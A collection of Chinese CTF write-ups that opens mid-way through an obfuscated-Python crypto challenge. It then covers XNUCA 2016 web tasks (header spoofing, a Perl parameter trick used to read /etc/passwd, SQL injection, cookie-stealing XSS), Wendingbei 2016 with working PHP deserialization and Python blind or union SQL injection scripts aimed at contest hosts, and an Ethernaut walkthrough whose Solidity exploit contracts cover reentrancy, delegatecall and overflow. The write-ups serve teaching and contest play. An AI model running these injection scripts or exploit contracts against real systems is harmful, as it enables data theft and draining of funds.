for __g['getbit'], getbit.__name__ in [(lambda p, pos: (lambda __l: [[[((__l['p'][__l['cpos']] >> __l['bpos']) & 1) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'] in [(p, pos)]][0])({}), 'getbit')]][0]

 for __g['setbit'], setbit.__name__ in [(lambda p, pos, value: (lambda __l: [[[(lambda __target, __slice, __value: [(lambda __target, __slice, __value: [__l['p'] for __target[__slice] in [((lambda __old: (lambda __ret: __old | __value if __ret is NotImplemented else __ret)(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (__l['value'] << __l['bpos'])) for __target[__slice] in [((lambda __old: (lambda __ret: __old & __value if __ret is NotImplemented else __ret)(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (~(1 << __l['bpos']))) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'], __l['value'] in [(p, pos, value)]][0])({}), 'setbit')]][0]

 for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))

```

核心部分我又整理了一次：
```python
[(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) for __g['sssss'] in [('')]][0] for __g['ssss'] in [(encode(ss, sss))]][0], []) for __g['sss'] in [([])]][0] for __g['ss'] in [([])]][0])[1] for __g['s'] in [(fin.read().strip())]][0] for __g['fin'] in [(open('flag.txt', 'r'))]][0] for __g['encode'], encode.__name__ in [
(lambda data, buf: (lambda __l: [[
  (lambda __items, __after, __sentinel: __y(
    lambda __this: lambda: 
      (lambda __i: [[__this() for __l['data'][__l['i']] in [((table.index(__l['data'][__l['i']]) + 1))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), lambda: (lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[[__this() 
        for __l['buf'] in [(
          setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0]
            for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0]
            for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))]][0] 
           
            for __l['data'], __l['buf'] in [(data, buf)]][0])({}), 'encode')]][0]
```

仔细看看，核心部分也就几句话：
```python
[data['i'] = ((table.index(data['i']) + 1))
__this() for __l['buf'] in [(
             j=(i / 6) * 8 + (i % 6)
             setbit(buf, i, getbit(data, j))
             
              if __i is not __sentinel else __after())(next(__items, __sentinel)))())
        
        (iter(xrange((__l['_len'] * 6)))

 for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))
```

其中`__g[xxxxx]`就是全局变量，`__l[xxx]`就是局部变量    
PS: 还有那个__y`(lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)())))`就是神秘的Y combinator，想了解更多的自行google....(不是那家公司- -是那家公司名字的由来)    

那么加密方式就出来了，把原字符在table的index+1后，把后6位保存到文件里      
（其实这里由于我懒得看setbit，getbit所以搞反了字节序，
后来把aaaaaaaaaaaa写入flag.txt用这个程序加密后仔细逐位对比后才发现- -||）

由于`6*4==3*8`，我就每3字节一起decode      
decode3b函数：
```python
def tobin(b):
	ret=''
	for i in [128,64,32,16,8,4,2,1]:
		ret+='1' if b&i else '0'
	return ret

def decode3b(s):
    a=s>>16
    b=(s>>8) & 0xFF
    c=s & 0xff
    sa=tobin(a)
    sb=tobin(b)
    sc=tobin(c)
    return table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)]

>>> a=open('flag.enc','rb')
>>> a=a.read()
>>> s=''
>>> for i in xrange(0, len(a), 3):
...     s+=decode3b(int(a[i:i+3].encode('hex'), 16))
...
>>> s
'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'
>>> s=''.join(map(lambda c: table[(table.index(c)+63)%64], s))
'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""'
```

由于只保留了最后6位，所以在table里的index大于64的特殊字符是没有的，要手动（脑）补上第7位，
查table+64可知`'q'->'{', 'o'->'_'`等等....
得：
`xdctf{0ne-l1n3d_Py7h0n_1s_@wes0me233}`




### File: CTF-Writeups/XNUCA201607WEB/README.md

# CountingStars 100

下载'/.DS_Store'恢复源代码，计算$$$$$$...$$$S的值是'd0llars'，提交后得到302跳转，里面的body部分就是flag

# Invisible 100

没什么好说的，加'X-Forwarded-For: 127.0.0.1'

# WeirdCamel 400

蛋疼perl的奇怪特性，http请求重复提交某一字段后会有奇怪效果....    
不附带参数直接post的话，perl代码接受到的变量的值大致好像是（这里用json表示）
```js
{
'name': 'PHONE',
'phone': '',
'email': ''
}
```
提交`name=1`有：
```js
{
'name': '1',
'phone': 'EMAIL',
'email': ''
}
```
提交`name=1&name=2`有：
```js
{
'name': '1',
'phone': '',
'email': ''
}
```
提交`name=1&name=2&name=3`有：
```js
{
'name': '1',
'phone': 'EMAIL',
'email': ''
}
```

从上面的效应大概可以知道，perl大概直接把hash结构存为一个数组，不提交参数时就是
```js
['NAME','PHONE','EMAIL']
```
解释成`{'NAME':'PHONE', 'EMAIL': ''}`，然后提交`name=1`的时候就变成：
```js
['NAME','1','PHONE','EMAIL']
```
解释成`{'NAME':'1','PHONE':'EMAIL'}`,然后提交`name=1&name=2`的时候就变成：
```js
['NAME','1','2','PHONE','EMAIL']
```
解释成`{'NAME':'1','2':'PHONE','EMAIL':''}`等等....

那么我们脑洞一下后就可以知道要改STATEMENT的值，那就提交`name=1&name=STATEMENT&name=/etc/passwd`就可以读取'/etc/passwd'啦     
读register.pl后可以发现里面有个注释了的`#print <a href='什么什么news.pl?id=1'>`，然后就是sql注入     

在perl里面转义函数quote()在形如"id=1'&id=2"的时候直接返回"1'"....也就是直接无障碍裸的sql注入....    

payload:
![perl.png](perl.png)


# BOSS 500

`http://question12.erangelab.com/login.php~`可以看代码，为什么这么执着于备份文件.....

```php
<?php
$username = $_POST['username'];
$password_md5 = $_POST['password'];
// check username and password
if($username=="editor" && $password_md5=="0e
{
// login success
// somecode...
}else{
// login fail
    echo 'ERROR:USERNAME OR PASSWORD WRONG!';
}
```

直接`username=editor&password=0`登录，然后要上传一个文件     
试了下发现`Content-Type:application/msword`，然后上传文件名中'/'前的字符全被扔掉，    
然后估计是在文件名里面XSS管理员，那么注意一下把'/'用'&#47;'代替一下就好，当然也可以用其他办法，    

XSS返回：
```
...
  'HTTP_CONNECTION' => 'keep-alive',
  'HTTP_CACHE_CONTROL' => 'max-age=0',
  'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
  'HTTP_ACCEPT' => 'image/webp,image/*,*/*;q=0.8',
  'HTTP_REFERER' => 'http://question12.erangelab.com/xnuca_checklist.php',
  'HTTP_ACCEPT_ENCODING' => 'gzip, deflate, sdch',
  'HTTP_ACCEPT_LANGUAGE' => 'zh-CN,zh;q=0.8',
  'PHP_SELF' => '/rec.php',
  'REQUEST_TIME_FLOAT' => 1469968445.9431269,
  'REQUEST_TIME' => 1469968445,
)array (
  'str' => 'send_role=xt=urn:btih:1207054EE7FBB53FF0708BDE6A7934B7E5095CC9',
)array (
)
```

下载cookie的磁力链接即可看到flag。


### File: CTF-Writeups/问鼎杯2016/README.md

# 问鼎杯2016

## 2-1

没什么好说的...就是脑洞

提交的url藏在页面里，搜一下`fulaige`可以找到提交token和key的url。然后是找token和key。

页面内联CSS中会有一项`t0ken: rgb(X, Y, Z)`，发几个请求diff一下就能注意到这里。
那么脑洞一下易知XYZ转成16进制后就是token。

然后是找key，css+html都藏过了那么就是藏在js里了吧。一开始注意到jquery 1.9.3搜不到这个版本，觉得藏在这里面。然后在控制台敲了个key浏览器就把key打出来了。

那么把key和token填在一开始得到的url里就能看到flag了。

## 2-2

跟`HITCON 2016`的`babytrick`很像，只是最后拿flag过程变成了盲注而已。

核心思路：
- 利用反序列化异常对象，来阻止`__wakeup`中的sql过滤代码被执行，直接执行`__destruct`。具体可以看HITCON的writeup，这里就不在多说了。
- 利用`>=`，`ascii()`，`substr()`等sql函数进行二分查找盲注加速拿flag

payload生成及获取flag代码：
```php
<?php

$res = "WDFLAG={Nation_is_more_important_than_anyt";

class COMEON {
    private $method;
    private $args;
    private $conn;

    function generate($str) {
        global $res;
        $this->conn = null;
        $this->method = 'show';
        $str = bin2hex($str);
        $pos = strlen($res)+1;
        $this->args = ["admin' and ascii(substr(password,{$pos},1)) >= 0x{$str} -- "];
        $this->isGenerator = true;
    }
    
    function __destruct() {
        if(isset($this->isGenerator)) return;
        if (!$this->conn) 
            echo "connect to db. ";
        echo "deconstruct called. ";
        //var_dump($this);
        if (in_array($this->method, array("show", "source"))) { 
            @call_user_func_array(array($this, $this->method), $this->args); 
        } 
    }
    
    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
    
    function show() { 
        list($username) = func_get_args(); 
        if(preg_match("/\b(select|insert|update|delete)\b/i",$username)){ 
            die("hello,hacker!"); 
        }
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username); 
        var_dump($sql);
    } 
}


$a = new COMEON();

$printable = [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'];

function guess($i) {
    global $res, $a, $printable;
    $a->generate($i);
    $data = serialize($a); $data = str_replace(';N;', ';O:9:"Exception":2:{s:7:"*file";R:4;};', $data);
    $url = "http://sec3.hdu.edu.cn/831291d147f8429887af12bcb53e2d91/?data=".urlencode($data);
    $ret = file_get_contents($url);
    //var_dump($i . " " . $ret);
    return $ret === ' {"msg":"admin is admin"}';
}

// return max "admin is admin"
function binarySearch($fl, $fr) {
    global $printable;
    if($fl == $fr) {
        return guess($printable[$fl]) ? $fl : -1;
    }
    if($fl == $fr - 1) {
        if(guess($printable[$fr])) return $fr;
        return binarySearch($fl, $fl);
    }
    $m = ($fl + $fr) >> 1;
    if(guess($printable[$m])) {
        $tmp = binarySearch($m+1, $fr);
        if($tmp !== -1) return $tmp;
        else return $m;
    } else {
        return binarySearch($fl, $m-1);
    }
}

for($i =0; $i < 10; $i++) {
  $tmp = $printable[binarySearch(0, count($printable)-1)];
  $res .= $tmp;
  var_dump($res);
}

?>
```

## 5-2

没什么好说的..基本上就是裸注入
貌似`username`必须要为`user`，所以从`id`字段做手脚
把要注入回显的有用信息的字符串转成ascii码存在`id`字段里，一字节一字节地读取即可。
要先在`information_schema`表里查查`table_name`和`column_name`，可知是在`fffflag`表内的`fflag`列中。

代码：
```python
from hashlib import md5
import requests

def innerText(txt, st, fin):
    txt = txt[txt.index(st)+len(st):]
    return txt[:txt.index(fin)]

def solve(cap):
    t=0
    while md5(str(t)).hexdigest()[:len(cap)] != cap:
        t+=1
    return str(t)
    
ss = ''
for i in xrange(1,10000):
    s = requests.session()
    a = s.get('http://sec2.hdu.edu.cn/e33cdf8c2126fc5490fbc5d7fc269036/').content
    cap = innerText(a, ",0,4) =='", "'")
    ans = solve(cap)
    payload = '''(select group_concat(fflag) from ffff1ag)'''
    payload = '''200 union select ascii(mid(%s,%d,1)) as id,username from users -- ''' % (payload,i)
    ret = s.post('http://sec2.hdu.edu.cn/e33cdf8c2126fc5490fbc5d7fc269036/', data={'id': payload, 'code': ans}).text
    c = chr(int(innerText(ret, '<th>name</th></tr><tr><td>', '</td>')))
    if ord(c) == 0: break
    print c
    ss += c
    
print ss
```



### File: CTF-Writeups/eth_writeup_ethernaut.zeppelin.solutions.md

# 前言

偶然看到了一个由 包含经典以太坊智能合约漏洞 的一系列合约组成的实战wargame，就简单写一个附有exploit的writeup。

当然还有一些经典漏洞没有覆盖到，可以查看文末的扩展阅读。

wargame地址： https://ethernaut.zeppelin.solutions/ 。
题目简单，每关通关后也会有comment来解释实际含义，非常适合新入坑的同学

这篇writeup也包含了一些solidity语言remix IDE/web3.js的简单操作使用方法。

前置条件：基本了解智能合约概念，了解solidity语言，了解ETH web3 json RPC provider、metamask基本原理和使用

这套题目，智能合约都部署在Ropsten测试网络，因此先要根据level0提示去faucet获取些测试网络ether。这个平台本身也是一个DApp，由一个智能合约负责管理每个关卡的合约instance。

# level0 Hello Ethernaut
题目说明已经很详细了。点击`Get new instance`， 然后浏览器console输入`await contract.info()`即可开始（只要你安装配置好metamask），嫌麻烦或者`contract.abi`查看abi直接猜出来通关方法：

```
> await contract.password()
"ethernaut0"
> await contract.authenticate("ethernaut0")
<metamask中确认交易>
> await contract.getCleared()
true
```
然后点击`submit instance`即可

可能由于网络原因不太稳定，可以多试几次。

另，console提示信息非常魔性...

# level1 fallback

这题主要就是熟悉平台和remix使用的签到题

点击关卡的Get Instance，浏览器js console会返回新创建的合约的地址，复制下来再用remix IDE (https://remix.ethereum.org/) 交互 （我比较习惯remix IDE中交互，当然对于简单的操作，浏览器console里用web3.js的api像之前一样直接调用合约方法也可以）

```solidity
pragma solidity ^0.4.18;

contract Fallback {

  mapping(address => uint) public contributions;

  function contribute() public payable;

  function getContribution() public view returns (uint);

  function withdraw() public;

  function() payable public;
}
```
在remix compile后，在run标签里填入合约地址，然后点击`At address`即可交互了。

这题的思路是，先value=1wei调用contribute()，然后value=1wei调用fallback()即可重设owner，最后value=0调用withdraw完成任务。

需要了解owner、msg.value、payable、fallback函数的含义

# level2 fallout
这题注意有个`Fal1out`函数，与合约名`Fallout`不一致，因此不是构造函数（构造函数在合约生成后就不存在了，这一过程实际上是contract creation交易包含构造函数的bytecode，该交易执行构造函数bytecode，然后内存里是合约的其余代码的bytecode，然后ETH节点把返回的bytecode放置在链上与合约地址关联起来），我们可以调用此函数来claim ownership

# level3 coin flip

除了我们手动调用合约的函数，我们也可以写合约来调用合约，因此这题只要写solidity代码我们就能得到block的信息了，思路同0ctf 2018线下赛的ZeroLottery题目：
```solidity
pragma solidity ^0.4.18;

contract CoinFlip {
    uint256 public consecutiveWins;
    function flip(bool _guess) public returns (bool);
}

contract MyContract {
    CoinFlip c;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function MyContract(address coinFlip) public {
        c = CoinFlip(coinFlip);
    }
    
    function exploit() public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return c.flip(side);
    }
}
```
remix IDE中compile后，我们需要部署MyContract，选择`injected web3` provider后在Deploy MyContract时，构造函数填入关卡合约instance的地址，然后在10个新区块中调用`exploit()`即可，需要花点时间，隔段时间等交易被打包进入一个区块后就又点击`exploit()`一次......10次比较蛋疼，尤其是网络不好

从这道题可以看出，智能合约系统内部没有安全的随机数，只能通过智能合约系统外部的调用实现。

# level4 telephone
这题主要考的就是tx.origin和msg.sender的区别了，在于msg.sender是函数的直接调用方，可能是你手工调用该函数，这时候是发起该交易的账户地址，也可以是调用该函数的一个智能合约的地址。但tx.origin一定只能是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，一定是账户地址而不是合约地址。因此只要写合约调用changeOwner即可，这时msg.sender是你写的智能合约地址，tx.origin是你的账户地址

```solidity
pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner);
}

contract MyContract {
    Telephone c;
    function MyContract(address _c) public {
        c = Telephone(_c);
    }
    
    function exploit() public returns (bool) {
        c.changeOwner(tx.origin);
    }
}
```

# level5 Token
整数溢出的问题，由于用的是uint无符号数，因此`20 - 21 = 0xFFFFFFFFF... > 0`，所以只要调用`transfer(随便一个地址, 21)`即可

# level6 delegation
我们看下delegatecall的文档：
```
There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.
```
简要概括，就是msg.sender和msg.value不会变，被调用方法能够access所有调用方contract的成员属性，以方便实现在链上放置library的这一feature。那么，只要在Delegation里利用delegatecall调用Delegate.pwn()函数即可修改Delegation.owner。

如果熟悉raw格式的交易的data的同学会知道，data头4个byte是被调用方法的签名哈希，remix里调用函数，实质只是向合约账户地址发送了`(msg.data[0:4] == 函数签名哈希)`的一笔交易，然后合约的bytecode就会执行，bytecode中含有判断签名哈希的函数分发逻辑。我们只需要调用Delegation的fallback的同时在msg.data放入pwn函数的solidity签名即可。在remix里，我们可以更方便地实现这一exploit，我们只要在Delegation代码里放入pwn函数的solidity签名，remix调用Delegation的假pwn()即可，这样pwn的函数签名哈希就会放在msg.data[0:4]了（当然实际执行的代码还是fallback的函数），如下：

```solidity
pragma solidity ^0.4.18;

contract Delegation {
   function pwn() public;
}
```
编译后填入关卡instance地址，点击at address，然后调用pwn即可（注意gas limit要调大一点不然会out of gas，不要用默认计算的gas limit）

对此不熟悉的同学可以看看编译器对于solidity的函数分发实现部分的相关compiled EVM bytecode

# level7 Force
`selfdestruct`函数可以强行发送ETH, 可参考https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56

```solidity
pragma solidity ^0.4.18;

contract Force {}

contract MyContract {
    Force c;
    function MyContract(address _c) public {
        c = Force(_c);
    }
    
    function exploit() payable public {
        selfdestruct(c);
    }
}
```

# level8 vault
区块链上所有东西都是公开的，查看json rpc文档可知道有`eth.getStorageAt()` API，根据solidity的“对象模型” (http://solidity.readthedocs.io/en/develop/miscellaneous.html)，可知`password`放在storage的1的位置

console里输入即可查看密码：
```js
web3.eth.getStorageAt(contract.address, 1, console.log);
```

如果在remix里调用unlock注意一下remix对bytes32参数的格式："0xXXXXXXXXX..." （包括双引号）

# level9 King
`king.transfer`函数在调用失败时会抛异常，后面`king = msg.sender;`就不会被执行，我们就达到目标了，因此只要让transfer时失败就行，我们让king不能接受eth transfer即可

```solidity
pragma solidity ^0.4.18;

contract King {
  address public king;
  uint public prize;
  function() external payable;
}

contract FallbackThrowException {
    address owner;
    
    function FallbackThrowException(address _c) payable public {
        owner = msg.sender;
        King c = King(_c);
        c.call.value(c.prize())();
    }
    
    function dtor() {
        selfdestruct(owner);
    }
    
    function() payable {
        throw;
    }
}
```

调用构造函数时，value=1.1 ether即可。

`FallbackThrowException`作为king时，transfer会调用`FallbackThrowException.fallback`，自然就throw失败了。

验证通过后可以调用dtor回收零头

# level10 Re-entrancy

由于`balances[msg.sender] -= _amount;`在发送ETH（`msg.sender.call.value(_amount)()`）的之后，我们可以用合约作为msg.sender，这样我们的合约的fallback函数就会在`msg.sender.call`被调用（在`-= _amount`之前），于是我们可以无限递归调用withdraw()函数来获得合约内所有的ETH。

```solidity
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract MyContract {
    Reentrance c;
    address owner;
    
    function MyContract(address _c) public payable {
        c = Reentrance(_c);
        owner = msg.sender;
        c.donate.value(msg.value)(this);
    }
    
    function() public payable {
        uint weHave = c.balanceOf(this);
        if (weHave > c.balance) {
            if (c.balance != 0) c.withdraw(c.balance);
            return;
        }
        c.withdraw(weHave);
    }
    
    function exploit() public {
        c.withdraw(0);
    }
    
    function dtor() {
        selfdestruct(owner);
    }
}
```
value=0.5 ether，填入关卡合约instance地址构造MyContract，然后调用exploit即可（注意要调大gas limit），调用dtor回收ETH。

这个漏洞的利用曾使得全网14%的以太坊被盗（被称为DAO Hack），社区决定以太坊分叉出ETH链，也就是ETH是回滚至被黑之前的链，ETC则是黑客拥有以太坊的原始链，由于矿工利益问题存活至今

# level11 Elevator

仔细阅读题目，可以想到这题的通关条件是`Elevator.top == true`。突破点在于interface里的view/constant/pure修饰符仅在于Solidity语言层面起作用，而实际EVM层面跨合约调用时并没有检查。于是，实际上isLastFloor是可以有副作用的。我们可以通过成员变量区分两次isLastFloor调用，第一次返回false第二次返回true即可。

```solidity
pragma solidity ^0.4.18;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public;
}

contract MyBuilding {
  bool private isArrived = false;
  Elevator c;
  
  function MyBuilding(address _c) {
      c = Elevator(_c);
  }
  
  function isLastFloor(uint) public returns (bool) {
      if (!isArrived) {
          isArrived = true;
          return false;
      }
      return true;
  }
  
  function exploit() public {
      c.goTo(777);
  }
}

```

# level12 Privacy
同上面某题，只要调用eth.getStorageAt就可以了，注意ethereum是大端序，比如bytes4(msg.data)就是被调用方法签名的哈希。

```js
> web3.eth.getStorageAt("0x443ba829e54bc353a774e19cd0f4c463bbd70292", 3, console.log);
< null "0x855225da826cf02c945e41f445f2c7491d28ecdd3e99e12abca7629d8b49ca9f"
> "0x855225da826cf02c945e41f445f2c7491d28ecdd3e99e12abca7629d8b49ca9f".substr(0,34)
< "0x855225da826cf02c945e41f445f2c749"
```

然后调用unlock就行了

# level13 Gatekeeper One

关键的`msg.gas`只要复制一份代码，在remix js vm里点击debug单步调试，看看由调用enter开始直到汇编语句`GAS`时所用的gas是多少，然后设定gas=81910加上消耗掉的gas数和`GAS`本身消耗的2即可。

但是，每个版本compiler编译出来的指令都不太一样，因此看代码要选择0.4.18版本（https://remix.ethereum.org/#optimize=false&version=soljson-v0.4.18+commit.9cf6e910.js）。在这里就踩了一下坑..

剩下就是注意一下solidity的类型转换截断的实现。


```solidity
pragma solidity ^0.4.18;

contract GatekeeperOne {
  function enter(bytes8 _gateKey) public returns (bool);
}

contract MyAgent {
    GatekeeperOne c;
    
    function MyAgent(address _c) {
        c = GatekeeperOne(_c);
    }
    
    function exploit() {
        uint64 gateKey = uint16(tx.origin) + (1 << 44);
        c.enter.gas(81910-81697+81910+2)(bytes8(gateKey));
    }
}
```

# level14 Gatekeeper Two
查看以太坊黄皮书第十页底部（https://ethereum.github.io/yellowpaper/paper.pdf）
```
4 During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while
CODESIZE should return the length of the initialization code (as defined in H.2
```

因此只要在构造函数内调用enter即可，剩下无非就是一个异或的简单逻辑，显然0-1=0xFFFFFF...，而对任意X有~X ^ X == 0xFFFF...，因此代码如下：
```solidity
pragma solidity ^0.4.18;

contract GatekeeperTwo {
  address public entrant;
  function enter(bytes8 _gateKey) public returns (bool);
}

contract MyAgent {
    function MyAgent(address _c) {
        GatekeeperTwo c = GatekeeperTwo(_c);
        c.enter(bytes8(~uint64(keccak256(this))));
    }
}
```


# level15 Naught Coin

这题的合约继承了`ERC20/StandardToken`(https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/token/ERC20/StandardToken.sol)，因此也自然继承了里面的一些函数。

我们可以看到ERC20还包含了allowance这种功能，以及里面自带一个transferFrom函数。利用思路是，我们可以创建一个合约`MyAgent`，然后手工调用`StandardToken.approve()`授权该合约使用我们的tokens，然后我们通过该合约`MyAgent.getAllToken()`调用`StandardToken.transferFrom()`函数把tokens全部转移即可，非常简单。或者直接自己approve自己账户地址，然后调用transferFrom也行。

代码如下：
```solidity
pragma solidity ^0.4.18;

contract NaughtCoin {

  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
  address public player;
  
  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool);

  function transfer(address _to, uint256 _value) lockTokens public returns(bool);

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      if (now < timeLock) {
        _;
      }
    } else {
     _;
    }
  }

  function approve(address _spender, uint256 _value) public returns (bool);
}

contract MyAgent {
    address owner;
    NaughtCoin c;
    
    function MyAgent(address _c) public {
        owner = msg.sender;
        c = NaughtCoin(_c);
    }
    
    function getAllToken() public {
        c.transferFrom(owner, this, c.INITIAL_SUPPLY());
    }
}
```

# Vulnerbilities总结

1. 复制代码时注意改构造函数名...应该用constructor关键字而不是用deprecated的与合约同名的函数作为构造函数
2. 合约中生成随机数时要注意其不安全
3. 注意msg.sender可以是智能合约地址
4. 注意整数overflow和underflow，尽量用safemath库
5. delegatecall要注意安全性
6. 不能假设你的合约不能接受ETH，也就是说注意`this.balance == 0`的使用
7. 区块链上没有不公开的东西
8. Address.transfer要处理异常
9. Address.call不安全，可能会消耗大量的gas或Out of gas
10. 除了payable外，不能在字节码层面的外部合约的view/constant/pure修饰符做假设，除非这个合约一定是你控制的
11. 继承或引用代码时要全面了解其代码

# 附录

- FreeBuf简介文章
以太坊去中心化应用dApp的渗透测试姿势浅析
http://www.freebuf.com/articles/blockchain-articles/174050.html

- Solidity文档
http://solidity.readthedocs.io

- 扩展阅读
https://github.com/b-mueller/smashing-smart-contracts/blob/master/smashing-smart-contracts-1of1.pdf

